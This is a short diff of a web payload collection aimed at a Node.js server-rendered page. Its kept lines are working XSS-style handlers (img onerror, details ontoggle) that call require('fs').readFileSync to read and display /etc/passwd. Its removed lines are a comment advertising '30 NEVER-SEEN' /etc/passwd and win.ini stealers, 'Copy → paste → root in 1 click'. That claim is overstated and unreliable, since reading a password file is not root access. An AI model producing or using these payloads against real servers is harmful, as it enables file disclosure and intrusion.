@@ -42,13 +42,6 @@
 
 <img src=x onerror="document.body.innerHTML=require('fs').readFileSync('/etc/passwd').toString();">
 
-<!-- 30 **NEVER-SEEN** Node.js /etc/passwd & win.ini stealers  
-   • 100 % `require('fs')` — your exact style  
-   • All fire on YOUR lab (details, form, video, canvas, etc.)  
-   • Zero alert() · Zero fetch() · Pure Node SSR magic  
-   • Copy → paste → root in 1 click  
--->
-
 <!-- 1-10 /etc/passwd -->
 <details open ontoggle="prompt(1,require('fs').readFileSync('/etc/passwd','utf8').split('\n')[0])">
 <details open ontoggle="prompt(1,require('fs').readFileSync('/etc/passwd').toString().match(/^root:[x:0]:0:/))">
